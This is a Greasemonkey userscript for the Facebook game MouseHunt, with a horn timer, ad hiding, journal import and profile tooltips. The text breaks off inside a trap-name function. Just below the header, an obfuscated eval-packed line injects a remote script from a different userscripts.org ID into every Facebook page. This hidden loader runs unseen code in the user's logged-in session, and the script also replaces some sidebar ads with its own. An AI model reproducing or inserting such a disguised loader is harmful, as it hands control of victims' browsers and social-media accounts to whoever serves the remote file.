// ==UserScript==
// @name 			MouseHuntizer by Furoma Tools Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace		Furoma
// @description		A GreaseMonkey user script to add nifty features meant to enhance your MouseHunt gameplay. 
// @include        	http://www.facebook.com/*
// @include        	http://apps.facebook.com/*
// @include        	http://furoma.com/*
// @require        	http://furoma.com/mhizer/firefox/latest/jquery-1.3.2.js
// @require        	http://furoma.com/mhizer/firefox/latest/jquery.drag.js
// @require        	http://furoma.com/mhizer/firefox/latest/jquery.qtip.js
// @author 		    Rohan Mehta ( rohan[at]furoma.com )

// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//Globals
var mhizer_version = '0.2.6';
var source_location = 'http://userscripts.org/scripts/source/80173.user.js';
var version_holder = 'http://furoma.com/mhizer/firefox/latest/version.txt';
var config_url = 'http://furoma.com/mhizer/firefox/config.php';

	
//Indices for hunter data
var _trap=0, _base=1, _location=2, _cheese=3, _title=4, _cheese=5, _shield=6, _status=7;

var doc_title = document.title;

var time_page_load = null;
var horn_seconds_left = null;
var time_horn = null;
var checked_time_once  = false;
var timeout;

//For Log Summarizer/Parser auto-post
var page1="", page2="", page3="";
var the_timeout;


//Options
var timer_position = GM_getValue('timer_position', 'movablebox');
var timer_alarm = GM_getValue('timer_alarm', "disable");
var timer_sound = GM_getValue('timer_sound', 'alarmclock.wav');
var timer_popup = GM_getValue('timer_popup', "enable");
var timer_to_title = GM_getValue('timer_to_title', "enable");
var timer_update = GM_getValue('timer_update', 5);
var remove_fbads = GM_getValue('remove_fbads', "enable");
var timer_otherpages = GM_getValue('timer_otherpages', "disable");
var mhize_links = GM_getValue('mhize_links', "disable");
var autopost_journals = GM_getValue('autopost_journals', "disable");
var add_ft_links = GM_getValue('add_ft_links', "enable");
var show_percentage = GM_getValue('show_percentage', "enable");
var autopost_tools = GM_getValue('autopost_tools', "enable");




/*
Save MHizer options
@since 0.1
@params none
*/
function save_mhizer_options(){

	//Display MHizer version
	$('#mhizer_version').html(mhizer_version);
	
	//Restore old options	
	$('select').each(function(){
			var this_id=$(this).attr('id');
			var this_val=GM_getValue(this_id, false);
			if(this_val != false)
				$(this).val(this_val);
				
	});
	
	//Show options table
	$('#mhizer_options_table').show();
	
	//Save Options on Click
	$('#save_options').click(function(){
	
		$('select').each(function(){
			var option_id=$(this).attr('id');
			var option_val=$(this).children('option:selected').attr('value');
			GM_setValue(option_id, option_val);	
		});

		$('#status').html("Options Saved");
		
		setTimeout(function() {
				$('#status').html("");
			}, 5000);
	});
}




/*
Add CSS.
@since 0.1
@params none
*/
function add_mhizer_css(){

	var mhizer_style='\n<style type="text/css">\n' 
					+ '.ft_tool_links{	font-size: 12px !important;	font-weight: 400 !important; padding-top: 4px;}\n'
					+ '.ft_tool_links a{ color: #FFF !important; text-decoration: underline; }\n'
					+ '.ft_tool_links a:hover{ color: #DFDFC3 !important;}\n'
					+ 'div.ui-tooltip-wrapper{ background-color: #FFFCDF; border: 1px solid #EFEAC2; padding:8px; line-height: 160%; } \n'
					+ 'div.ui-tooltip-accessible{ left: -10000em !important; top: -10000em !important; display: block !important; visibility: hidden !important;}\n'
					+ 'div.ui-tooltip, div.qtip{ position: absolute; display: none; max-width: 280px;min-width: 50px; }\n'
					+ 'div.ui-tooltip .ui-tooltip-wrapper, div.ui-tooltip .ui-tooltip-content, div.ui-tooltip .ui-tooltip-titlebar { position: relative;	}\n'
					+ '</style>\n';
					
	$('head').append(mhizer_style);
}




/*
Checks if the current page is a MouseHunt Page
@since 0.1
@params none
*/
function is_mh_page(){

	//These are MH specific IDs
	if( $('#app_content_10337532241').length >0 || $('#app10337532241_overlayContainer').length > 0  || $('#app10337532241_header').length > 0 )
		return true;
	
	
	//if( document.location.href.indexOf('apps.facebook.com/mousehunt') != -1 )
	//	return true;
		
	return false;
}




/*
Checks if the current page is a Facebook Page
@since 0.1
@params none
*/
function is_fb_page(){

	//Check if href has facebook.com
	if( document.location.href.indexOf('facebook.com') != -1 )
		return true;
		
	return false;
}




/*
Checks if the current page is a furoma.com Page
@since 0.1
@params none
*/
function is_furoma_page(){

	//Check if href has furoma.com
	if( document.location.href.indexOf('furoma.com') != -1 )
		return true;
		
	return false;
}



/*
Checks if the current page is a furoma.com Log Summarizer Page
@since 0.1
@params none
*/
function is_summarizer_page(){

	//Check if is on furoma.com
	if( !is_furoma_page() )
		return false;
	
	//Check if href has 'log_summarizer.php'
	if(document.location.href.indexOf('log_summarizer.php') == -1)
		return false;
		
	return true;
}



/*
Checks if the current page is a furoma.com Log Parser Page
@since 0.1
@params none
*/
function is_parser_page(){

	//Check if is on furoma.com
	if( !is_furoma_page() )
		return false;
	
	//Check if href has 'log_parser.php'
	if(document.location.href.indexOf('log_parser.php') == -1)
		return false;
		
	return true;
}


/*
Checks if the current page is a furoma.com Catch Rates Page
@since 0.2
@params none
*/
function is_catch_rates_page(){

	//Check if is on furoma.com
	if( !is_furoma_page() )
		return false;
	
	//Check if href has 'catch_rate_estimates.php'
	if(document.location.href.indexOf('catch_rate_estimates.php') == -1)
		return false;
		
	return true;
}



/*
Checks if the current page is the MHizer config page
@since 0.1
@params none
*/
function is_config_page(){

	//Check if href has furoma.com
	if( document.location.href.indexOf('furoma.com/mhizer/firefox/config.php') != -1 )
		return true;
		
	return false;
}


/*
Check if alarm is supposed to be sounded, and sound it if necessary.
@since 0.1
@params none
*/
function check_and_sound_alarm(){
	
	if(timer_alarm == "disable")
		return;
		
	$('#alarm').remove();
	
	
	$('body').append("<span id='alarm'></span>");
		
	$('#alarm').html("<embed type='audio/mpeg' loop='false' hidden='true' width='0' height='0' src='http://furoma.com/mhizer/firefox/sounds/mousehunt_horn_timer_"+ timer_sound+ "' autostart='true'> </embed>");


}


/*
Find time left for sounding the horn.
@since 0.1
@params none
*/
function check_time_left(){
	
	//On MH Pages, direct access.
	if(is_mh_page()){
		//Get all script tags
		var AllScripts = document.getElementsByTagName("script");
		
		//Loop through all the scripts
		
		for(i = 0; i< AllScripts.length; i++){
		
			if(AllScripts[i].innerHTML.indexOf("next_activeturn_seconds") != -1){
			
				myWaitLoc=AllScripts[i].innerHTML.indexOf("next_activeturn_seconds")+26;
				myMsgHolder=AllScripts[i].innerHTML.substr(myWaitLoc,5);
				myTimeEnd=myMsgHolder.indexOf(",");
				myMsg=myMsgHolder.substr(0,myTimeEnd);	
				horn_seconds_left =  myMsg*1;

				break;
			}
		}
		
	}//endif
	
	
	//Else XHR request the MH Page
	else{
		checked_time_once = true;	
		
				
			
			GM_xmlhttpRequest({
				method: 'GET',
				url: 'http://apps.facebook.com/mousehunt/index.php',
				headers: {
						'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
						'Content-type':'application/x-www-form-urlencoded',
				},
				onload: function(response_xhr) {
		
					var response_html = String(response_xhr.responseText);
					
					if(response_html.indexOf("next_activeturn_seconds") != -1){

			
						myWaitLoc=response_html.indexOf("next_activeturn_seconds")+26;
						myMsgHolder=response_html.substr(myWaitLoc,5);
						myTimeEnd=myMsgHolder.indexOf(",");
						myMsg=myMsgHolder.substr(0,myTimeEnd);
						horn_seconds_left =  myMsg*1;
						
						$('body').append('<input type="hidden" value="'+horn_seconds_left+'" id="rm_next_activeturn_seconds" />');
						
						//If "The King wants to give you a reward!" is found in the page, a King's reward needs to be collected.
						if ( response_html.indexOf('The King wants to give you a reward!')!=-1 || response_html.indexOf('In order to continue hunting mice, you need to enter the code displayed on the left.')!=-1 ){
							$('body').append('<input type="hidden" value="kingsreward" id="rm_kingsreward" />');
						}
				
						//If out of cheese, display a relevant message
						else if( response_html.indexOf('You are out of bait!') != -1){
							$('body').append('<input type="hidden" value="nocheese" id="rm_nocheese" />');

						}
						
					}
					
				}
				
			});
			
			
			
	}//endelse
	
	
}

/*
Create timer box div
@since 0.1
@params none
*/
function create_timer_box(){

	if(timer_position == "movablebox" || timer_position=="fixedmovablebox" || timer_position=="invisible"){
	
			var close_link_image = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVCAIAAAAmdTLBAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gYKECMhBqiEGQAAADJ0RVh0Q29tbWVudABFcnN0ZWxsdCB2b24gRmxvcmlhbiBTY2hyZWllciBtaXQgVGhlIEdJTVCOHcWrAAADLUlEQVR42pWUPYhdRRiG32/OuTdZXTcas0n2ZiVVYBttLFLFQuNPZTQgiIIphGBAtNTC0lZBRRQVEYWoBAyk8ActRFCRLa3SpNH9icm699695+6Z+X5ei7Obtc1UH+/MM+/M9w4jJD0wnNi9czVuZ3iwSlKbQ5ohP3rzn+FGTBvmlqbUgpRgBQDdAbC0AOAepbV2ezI3v/Txd+nuQ0Jy4+3XqsMDqeqYjHxryJJRCiPgRneAMKU7rbBktlNrtoaj0WrvrpMXlxMAH29Kf5/0+6hqqXtS16h7SImpkqqSVCHVkipIQqq6NanuTdZXDs7VNQA2WzEZS12znTJvM2eWQi1UpSnDqQUgtcCVpnRHSqmqACQA1BKToY83oxnPPvz0/BvvR9OwaaKZeDOO8TC2NmP077FPfjzw/CvM23STlKTu3eKV04bbE+a8/8FTAI6+dTG00Aq00DK1LF78HcDs6bNwAwPcSaHjc5TCXKh6/fVz3cTggytwQzjc7vt6uRP/OrOEcGEAAXKHB8DcRm5pCvf1V5/pxGOf/kT64pd/7MBPnoArXEEXUrDLRztFyVCFOSMoXH35TMcsfvFrV6ycXUqJIiFwoUmYROz6mzK30LJ7Nwq5+tITt57a6rP3S6IIk0TqeBrC9/oXVhjOcGGIAAmDD7+/xQ+++jMl7PmHwlXC9vrHkqkFYWSQXHjvSkeun3+oK458tizdFjAJEytpz98KNdMK3Ri+8M43O/CFRwBef/EkALlj7sila4IQBlzFC013+bLjT9WFdy938NqFx0CCBHjj3AOdePjyqoSmDv7f+Qtzy9JS8/SXbwGsnT8NN3b5hzP8xnMnALQ/fI5wmkELzQAIyWun5qsD98jMbNq3X6oaAjAEAYRQJYpYFi+wgtKyFMtlPPWrW3zqatQAVEu020kqiZCqliQIh6CLOoXCi1iBFahRzdTVQh0A6pujaA4OuHkDyqqfUdWAgCFCYQi9gsNVwukqZjQ35UghC8cByDSTG3///MKjo7WVfq+mSEhCRJVEAKFXdAlPDPdAeMUozjh6/PFLv/UPDYRkVuzr3dbfh5sjv3OmmunjP4EhhHJu9NM9AAAAAElFTkSuQmCC";
			var close_link = "<a href='#' onclick='$(\'#timer_box_handle\').remove()' class='timer_close_link'><img src='" +close_link_image+ "' border='0' alt='X' width='15px' /></a>";
			
			$('body').append("<div id='timer_box_handle' style='position:absolute; z-index:100; border:1px solid #222; padding:5px 5px; color:#333; font-family:Lucida Grande, Verdana, Arial, sans-serif; font-size:14px; min-width:125px; background:#FFFEEF; -moz-border-radius: 4px; cursor:move; '></div>");
			
			if(timer_position=="fixedmovablebox")
				$('#timer_box_handle').css("position", "fixed");
			
			if(timer_position=="invisible")
				$('#timer_box_handle').css("display", "none");
				
			
			$('#timer_box_handle').html("<a href='#' onclick='$(\"timer_box_handle\").remove()'><img src='" + close_link_image + "' alt='X' width='15px' border='0' /></a> <span id='mh_min'>Loading...</span>");
			
			//Get box position from localStorage (HTML5 feature)
			var box_position = GM_getValue('mh_box_position', '50px_100px');
			var this_position=Array();
			
			this_position = box_position.split("_"); //Since the coords are stored as 50px_300px(example)
			
			
			$('#timer_box_handle').css("top", this_position[0]);
			$('#timer_box_handle').css("left", this_position[1]);
			
			
			//Make box draggable
			$("#timer_box_handle")
				.drag(function( ev, dd ){
					$( this ).css({
						top: dd.offsetY,
						left: dd.offsetX
					});
				})
				.drag("end",function(){	
					var posn_top=$("#timer_box_handle").css("top");
					var posn_left=$("#timer_box_handle").css("left");				
					GM_setValue('mh_box_position', posn_top + "_" + posn_left );					   
				});

			
	} //endif
	
	
	
	else if(timer_position == "fbmenu"){
		$('#pageNav').prepend("<li><span id='mh_min'></span>");
		$('#mh_min').css("color", "#FFF");
	
	
	}//endif
	
	set_timer_box();
	
	
				
	
	
}



/*
Set horn timer box
@since 0.1
@params none
*/
function set_timer_box(){

	//Get current time		
	var datenow = new Date();
	var current_time = datenow.getTime();

	//Set page load time
	if(time_page_load == null){
		time_page_load = current_time;			
	}
	
	//Set time for horn (in seconds, from page load time)
	
	
	if(is_mh_page()){
		if(horn_seconds_left == null){	
			check_time_left();
		}
	}
	else{
			if(horn_seconds_left == null){
				if(!checked_time_once)	
					check_time_left();
				else
					horn_seconds_left = $('#rm_next_activeturn_seconds').val();
			}
			
			if(horn_seconds_left == null){
				timeout = setTimeout(set_timer_box, 1000);
				return;
			}
		}
		
	
	
	//Set time at which the horn is to sound		
	time_horn = time_page_load + (horn_seconds_left * 1000);				
	
	
	//Check number of seconds left before next horn
	var seconds_left =  Math.ceil( (time_horn - current_time) / 1000 ); 
	
	
	//Clear any existing timeouts
	clearTimeout(timeout);
	
	if(is_mh_page()){
	
		//If "The King wants to give you a reward!" is found in the page, a King's reward needs to be collected.
		if ( $('#app10337532241_hornTitle').html().indexOf('The King wants to give you a reward!')!=-1 || $('body').html().indexOf('In order to continue hunting mice, you need to enter the code displayed on the left.')!=-1 ){
			$('#mh_min').html("King's reward due!");
			if(timer_to_title == "enable")
				document.title = "King's Reward | " + doc_title;
			check_and_sound_alarm();
			return;
		}
		
		//If out of cheese, display a relevant message
		else if( $('#app10337532241_hud_baitName').html().indexOf('None!') != -1){
			$('#mh_min').html("<a class='fb_menu_link' href='http://apps.facebook.com/mousehunt/inventory.php'>Out of cheese!</a>");
			if(timer_to_title == "enable")
				document.title = "Out of Cheese! | " + doc_title;
			check_and_sound_alarm();
			return;

		}
	}
	
	else{
	
		if ( $('#rm_kingsreward').length > 0 ){
			$('#mh_min').html("King's reward due!");
			if(timer_to_title == "enable")
				document.title = "King's Reward | " + doc_title;
			check_and_sound_alarm();
			return;
		}
		
		//If out of cheese, display a relevant message
		else if( $('#rm_nocheese').length > 0){
			$('#mh_min').html("<a class='fb_menu_link' href='http://apps.facebook.com/mousehunt/inventory.php'>Out of cheese!</a>");
			if(timer_to_title == "enable")
				document.title = "Out of Cheese! | " + doc_title;
			check_and_sound_alarm();
			return;

		}
	
	}
	
	//If the number of seconds left is <= 0, then its time to sound the horn!
	
	if( seconds_left <= 0 && horn_seconds_left != null){
	
		clearTimeout(timeout);
		
		$('#mh_min').html("<a class='fb_menu_link' href='http://apps.facebook.com/mousehunt/turn.php'>Sound the horn!</a>");
		
		if(timer_to_title == "enable")
			document.title = "Sound the Horn! | " + doc_title;
		check_and_sound_alarm();
		
		//If popup is enabled, confirm take 'em to the turn.php page
		if(timer_popup=="enable" && confirm("It's time to sound the horn!\nDo you want to sound it now?\n\nNOTE: By clicking OK, the horn will be sounded on this tab, so please click cancel if you are in the middle of completing a form."))
			window.location.href = "http://apps.facebook.com/mousehunt/turn.php";
			
			

	}
	
	//Else - update mh_min with the time left
	else{
		
		var horn_min_left = Math.floor(seconds_left/60);
		var horn_sec_left = seconds_left%60;
		
		if(horn_sec_left <= 9)
			horn_sec_left = "0" + horn_sec_left;
			
					
		
		$('#mh_min').html("MH:<strong style='font-size:16px'>" + horn_min_left + ":" + horn_sec_left + "</strong>");
		
		
		//Append time left to document title			
		if(timer_to_title == "enable")
			document.title = horn_min_left + ":" + horn_sec_left + " | " + doc_title; 
		
		
		//Set timeout to check for time, again.	
		//Timeout in seconds is set by the user
		timeout = setTimeout(set_timer_box, timer_update*1000);
	
	}
		


}



/*
remove Facebook ads
@since 0.1
@params none
*/
function remove_facebook_ads(){

	//90% of the time, hide facebook ads.
	if(Math.random() <= 0.9){
		$('#sidebar_ads').children().hide();
		$('#sidebar_ads').children().css("height", "0px");
	}
	
	//The other 10% of the time, populate the ads with our ads.
	else{
		$('#sidebar_ads').html('<span style="margin-top:55px;margin-left:35px;"><iframe src="http://furoma.com/mhizer/firefox/ads.html" style="border: 0px none #ffffff;" width="140" height="620" scrolling="no" frameborder="0"></iframe></span>');
	}

}


/*
Get Facebook ID from URL
@since 0.1
@params url=Facebook URL, name=parameter to extract
*/

function get_id(url, name){
	name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
	var regexS = "[\\?&]"+name+"=([^&#]*)";
	var regex = new RegExp( regexS );
	var results = regex.exec( url );
	if( results == null )
		return false;
	else
		return results[1];
}


/*
Adds Furoma Tools links to the MH menu.
@since 0.1
@params none
*/
function add_furoma_links(){

	var ft_tool_links = '<span class="ft_tool_links">'+
							'<a target="_blank" href="http://furoma.com/?utm_campaign=mhizer_firefox_menu&utm_source=mhizer_firefox&utm_medium=gm&">Furoma MH Tools</a> | '+
							'<a target="_blank" href="http://furoma.com/catch_rate_estimates.php?utm_campaign=mhizer_firefox_menu&utm_source=mhizer_firefox&utm_medium=gm">Catch Rates</a> | '+
							'<a target="_blank" href="http://furoma.com/log_summarizer.php?utm_campaign=mhizer_firefox_menu&utm_source=mhizer_firefox&utm_medium=gm">Log Summarizer</a> | '+
							'<a target="_blank" href="http://furoma.com/log_parser.php?utm_campaign=mhizer_firefox_menu&utm_source=mhizer_firefox&utm_medium=gm">Log Parser</a> | '+
							'<a target="_blank" href="http://furoma.com/travel_planner.php?utm_campaign=mhizer_firefox_menu&utm_source=mhizer_firefox&utm_medium=gm">Travel Planner</a>'+
						 '</span>';
	
	$('#app10337532241_hudLocationContent').append(ft_tool_links);

}



	
/*
Get each MH journal page by XHR and extract logs.
@since 0.1
@params none
*/


function get_page(pageno){
	GM_xmlhttpRequest({
				method: 'GET',
				url: 'http://apps.facebook.com/mousehunt/journal.php?page='+pageno,
				headers: {
						'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
						'Content-type':'application/x-www-form-urlencoded',
				},
				onload: function(response_xhr) {
				
					var response_html = String(response_xhr.responseText);
								
					response_html = response_html.replace(/\n/g,'ZZZ');					
					
					
					if(response_html.indexOf("app10337532241_journalContainer") != -1){
						var journal_entries="";
						//If NOT king's reward - different check (not 'The King wants to...') because of no JS due to XHR
						if ( response_html.indexOf('In order to continue hunting mice, you need to enter the code displayed on the left') ==-1 ){		
							
							//Use [0] to get only first match - Added as of v0.7
							response_html = String(response_html.match(/<div class="leftcol">(.+)<div class="bottom">/)[0]);
							response_html = response_html.replace(/ZZZ/g,'\n').replace(/</g,'\n<').replace(/>/g,'>\n').replace(/\t/g,'');	
							response_html = response_html.replace(/<div class="journaldate">/g,'ZZZ').replace(/<div class="journaltext">/g,'ZZZ').replace(/<\/div>/g,' <\/div>').replace(/<.+>/g,'').replace(/\n/g,'');
							response_html = response_html.replace(/&#58;/g, ':');
							response_html = response_html.replace(/ZZZ/g,'\n');			
								
							journal_entries = '***From Page ' +pageno+ '\n'+ response_html+'\n\n';		
						}
						
						else{				
							journal_entries="KINGS REWARD";
						}
						
						switch(pageno){		
							case 1: page1=journal_entries;	break;
							case 2: page2=journal_entries;	break;
							case 3: page3=journal_entries;	break;
						}
						
						
					}
				}				
		
	});
	
	
}






/*
Check for completion of summarizer page loads.
@since 0.1
@params none
*/
function get_all_pages(){

	//Check for Kings Reward
	if(page1 == "KINGS REWARD" || page2 == "KINGS REWARD" || page3 == "KINGS REWARD"){
		$('#inputtext').val('King\'s Reward due. Please collect it and then refresh this page');
		return;
	}
	
	//If any of the pages are empty, the summarizer page load isn't complete
	if(page1 != "" && page2 != "" && page3 != "")
		$('#inputtext').val(page1+page2+page3);
	else{
		var percent = 0;
		if(page1 != "")
			percent+=33;
		if(page2 != "")
			percent+=33;
		if(page3 != "")
			percent+=33;
			
		
		$('#inputtext').val("Importing MouseHunt journals...\n(About " + percent + "% done)");
			
		
		the_timeout=setTimeout(get_all_pages, 1000);
	}
}
	

/*
Shows exact title completion percentage.
@since 0.1
@params none
*/
function show_title_percent(){

	var current_percent=$('#app10337532241_hud_titlebar').attr('title');
	
	var rem_posn=current_percent.indexOf('% complete');
	current_percent=current_percent.substring(0, rem_posn);
	
	$('#app10337532241_hud_titlePercentage').html(current_percent);	
	

}

/*
Reset timer value.
@since 0.2
@params none
*/
function reset_timer_value(){
	
	horn_seconds_left = parseInt(unsafeWindow.a10337532241_user?unsafeWindow.a10337532241_user.next_activeturn_seconds:0);
	set_timer_box();

}





/*
Add tooltip links
@since 0.2
@params none
*/

function mh_links_tooltip(){
	
	//var all_links=$('a');
	
	$('a').each(function(){
		var $this = $(this);
		var href = String($this.attr('href'));
		var fb_id=false;
	
		//Facebook profile link
		if(href.indexOf('facebook.com/profile.php?id=') != -1)
			fb_id = get_id(href, 'id');
		
		//MH profile link
		else if(href.indexOf('facebook.com/mousehunt/hunterprofile.php?snuid=') != -1)
			fb_id = get_id(href, 'snuid');
			
		
		//If not a profile link, next iteration
		if(fb_id ){			
			
			var content = '<strong>Facebook:</strong> '+
				'<a href="http://www.facebook.com/profile.php?id='+fb_id+'">Profile</a>'+
				' | <a href="http://www.facebook.com/inbox/?compose&id='+fb_id+'">Message</a>'+
				' | <a href="http://www.facebook.com/addfriend.php?id='+fb_id+'">Add</a>'+
				' | <a href="http://www.facebook.com/friends/?id='+fb_id+'">View friends</a>'+
				'<br /><strong>MouseHunt:</strong> '+
				'<a href="http://apps.facebook.com/mousehunt/hunterprofile.php?snuid='+fb_id+'">Profile</a>'+
				' | <a href="http://apps.facebook.com/mousehunt/supplytransfer.php">Give supplies</a>';
				
				
				$this.qtip({ 
					content: content,
					position: {
						   corner: {
							  target: 'bottomRight',
							  tooltip: 'topLeft'
						   }
						},
					hide: {
						delay: 200,
						fixed: true // Make it fixed so it can be hovered over
					}

				});
				
			

		
		}
	});
	


}




/*
Auto-post to Catch Rates tool
@since 0.2
@params none
*/
function to_catch_rates(){	

	//Tell users we are starting...
	$('#mhizer_autopost').val('Getting data...');

	GM_xmlhttpRequest({
		method: 'GET',
		url: 'http://apps.facebook.com/mousehunt/',
		headers: {
				'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
				'Content-type':'application/x-www-form-urlencoded',
		},
		onload: function(response_xhr) {
			var response_html = response_xhr.responseText;				
			//var _trap=0, _base=1, _location=2, _cheese=3, _title=4, _cheese=5, _shield=6, _status=7;				
			var hunter_data = get_hunter_data(response_html);
			var _found_trap=false, _found_base=false, _found_location=false, _found_cheese=false, _found_shield=false;
			
			if(hunter_data[_status] == "KINGS REWARD"){
				alert("Please claim your King's Reward!");
				$('#mhizer_autopost').val('MHizer - AutoPost data');
				return;
			}
			
			else if(hunter_data[_status] == "MAINTENANCE"){
				alert("MouseHunt is undergoing maintenance, so your details couldn't be retrieved.");
				$('#mhizer_autopost').val('MHizer - AutoPost data');
				return;
			}
			
			else if(hunter_data[_status] == "NOT SIGNED IN"){
				alert("You need to be signed in to Facebook to retrieve data.");
				$('#mhizer_autopost').val('MHizer - AutoPost data');
				return;
			}
			
			//Trap
			$('#traps0 option').each(function(){					
					$(this).attr('selected', false);				
			});				
			$('#traps0 option').each(function(){
				var $this = $(this);					
				var option_text = $this.text().toLowerCase();					
				if(option_text == hunter_data[_trap]){
				$this.attr('selected', true);
				_found_trap=true;
					return;
				}				
			});
			
			
			//Base
			$('#bases0 option').each(function(){					
					$(this).attr('selected', false);				
			});				
			$('#bases0 option').each(function(){
				var $this = $(this);					
				var option_text = $this.text().toLowerCase();					
				if(option_text == hunter_data[_base]){
				$this.attr('selected', true);
				_found_base=true;
					return;
				}				
			});
			
			
			//Location
			$('#locations0 option').each(function(){					
					$(this).attr('selected', false);				
			});				
			$('#locations0 option').each(function(){
				var $this = $(this);					
				var option_text = $this.text().toLowerCase();					
				if(option_text == hunter_data[_location]){
				$this.attr('selected', true);
				_found_location=true;
					return;
				}				
			});
			
			
			//Cheese
			$('#cheese0 option').each(function(){					
					$(this).attr('selected', false);				
			});				
			$('#cheese0 option').each(function(){
				var $this = $(this);					
				var option_text = $this.text().toLowerCase();					
				if(option_text == hunter_data[_cheese]){
				$this.attr('selected', true);
				_found_cheese=true;
					return;
				}				
			});
			
			//Shield
			$('#shield0 option').each(function(){					
					$(this).attr('selected', false);				
			});				
			$('#shield0 option').each(function(){
				var $this = $(this);					
				var option_text = $this.text().toLowerCase();	
				if(option_text == hunter_data[_shield]){
				$this.attr('selected', true);
				_found_shield=true;
					return;
				}				
			});
			
			var error='';
			
			if(_found_trap==false){
				$('#traps0 option:first').attr('selected', true);	
				error += "Couldn't find the trap '"+hunter_data[_trap]+"'\n";
			}
			if(_found_base==false){
				$('#bases0 option:first').attr('selected', true);	
				error += "Couldn't find the base '"+hunter_data[_base]+"'\n";
			}
			if(_found_location==false){
				$('#locations0 option:first').attr('selected', true);	
				error += "Couldn't find the location '"+hunter_data[_location]+"'\n";
			}
			if(_found_cheese==false){
				$('#cheese0 option:first').attr('selected', true);	
				error += "Couldn't find the cheese '"+hunter_data[_cheese]+"'\n";
			}
			if(_found_shield==false){
				$('#shield0 option:first').attr('selected', true);	
				error += "Couldn't find the shield '"+hunter_data[_shield]+"'\n";
			}
			
			if(error != "")
				alert(error +"\n\nPlease report these errors to rohan[at]furoma.com");
				
			//Restore the button				
			$('#mhizer_autopost').val('MHizer - AutoPost data');
			
			unsafeWindow.mhizer_gen();
			
			
		}
		
	
	});
			

}

	
/*
Get hunter data from XHR request HTML
@since 0.2
@params hunter_html -> mousehunt/index.php source
*/
function get_hunter_data(hunter_html){

	hunter_html = String( hunter_html.replace(/\sfbcontext="(.+?)"/g, "") );
	
	var hunter_data = Array();
	hunter_data[_trap] = "";
	hunter_data[_base] = "";
	hunter_data[_location] = "";
	hunter_data[_title] = "";
	hunter_data[_cheese] = "";
	hunter_data[_shield] = "";
	hunter_data[_status] = "";
	
	if ( hunter_html.indexOf('The King wants to give you a reward!')!=-1 ){		
		hunter_data[_status] = "KINGS REWARD";
		return hunter_data;
	}
	else if ( hunter_html.indexOf('MouseHunt will return shortly')!=-1 || hunter_html.indexOf('MouseHunt is curently unavailable')!=-1 ){		
		hunter_data[_status] = "MAINTENANCE";
		return hunter_data;
	}
	else if ( hunter_html.indexOf('Sign up for Facebook to use MouseHunt.')!=-1 ){		
		hunter_data[_status] = "NOT SIGNED IN";
		return hunter_data;
	}
	
	hunter_data[_status] = "OK";
	
	var trap = String( hunter_html.match(/<span id="app10337532241_hud_weapon">(.+?)<\/span>/)[0] );
	trap = String( trap.toLowerCase().replace(/<(.+?)>/g, "") );		
	
	var base = String( hunter_html.match(/<span id="app10337532241_hud_base">(.+?)<\/span>/)[0] );
	base = String( base.toLowerCase().replace(/<(.+?)>/g, "") );	
	
	var location = String( hunter_html.match(/<span id="app10337532241_hud_location">(.+?)<\/span>/)[0] );
	location = String( location.toLowerCase().replace(/<(.+?)>/g, "") );
	
	var hunter_title = String( hunter_html.match(/<span id="app10337532241_hud_title">(.+?)<\/span>/)[0] );
	hunter_title = String( hunter_title.toLowerCase().replace(/<(.+?)>/g, "") );
	
	var cheese = String( hunter_html.match(/<span id="app10337532241_hud_baitName">(.+?)<\/span>/)[0] );
	cheese = String( cheese.toLowerCase().replace(/(<(.+?)>|&nbsp;)/g, "") );
	
	var shield='inactive';
	if(hunter_html.indexOf('header_golden_shield.gif') != -1)
		shield='active';
	
	
	trap = fix_trap(trap);
	base=fix_base(base);
	cheese=fix_cheese(cheese);
	hunter_title = fix_title(hunter_title);
	location = fix_location(location);
	
	
	
	hunter_data[_trap] = trap;
	hunter_data[_base] = base;
	hunter_data[_location] = location;
	hunter_data[_title] = hunter_title;
	hunter_data[_cheese] = cheese;
	hunter_data[_shield] = shield;
	return hunter_data;	

}




/*
Fix hunter title.
@since 0.2
@params this_title -> title to be fixed
*/
function fix_title(this_title){

	if (this_title == 'lord' || this_title == 'lady')
		return 'lord/lady';
	if (this_title == 'baron' || this_title == 'baroness')
		return 'baron/baroness';
	if (this_title == 'count' || this_title == 'countess')
		return 'count/countess';
		
	return this_title;	

}


/*
Fix cheese.
@since 0.2
@params this_cheese -> cheese to be fixed
*/
function fix_cheese(this_cheese){

	if (this_cheese == 'super|brie+')
		return 'super brie';
	if (this_cheese == 'vanilla stilton...')
		return 'Vanilla Stilton Cheese';
	if (this_cheese == 'radioactive blu...')
		return 'Radioactive Blue Cheese';
	

		
	return this_cheese;	

}


/*
Fix trap.
@since 0.2
@params this_trap -> trap to be fixed
*/
function fix_trap(this_trap){

	if (this_trap == 'arcane capturin...')
		return 'arcane capturing rod of never yielding mystery';
	if (this_trap == 'ancient box tra...')
		return 'ancient box trap';
	if (this_trap == 'ancient spear g...')
		return 'ancient spear gun';
	if (this_trap == 'thorned venus m...')
		return 'thorned venus mouse trap';
	if (this_trap == 'christmas crack...')
		return 'christmas cracker trap';
	if (this_trap == '2010 blastoff t...')
		return '2010 blastoff trap';
	if (this_trap == 'nvmrc forcefiel...')
		return 'nvmrc forcefield trap';
	if (this_trap == 'clockapult of t...')
		return 'clockapult of time';
	if (this_trap == 'zugzwang\'s last...')
		return 'zugzwang\'s last move';
	if (this_trap == 'swiss army mous...')
		return 'swiss army mouse trap';
	if (this_trap == 'mouse mary o\'nette')
		return 'zugzwang\'s last move';
	if (this_trap == 'hitgrab rockin\'...')
		return 'hitgrab rockin\' horse';
	if (this_trap == 'zugzwang\'s last...')
		return 'zugzwang\'s last move';
	if (this_trap == 'obelisk of inci..')
		return 'obelisk of incineration';
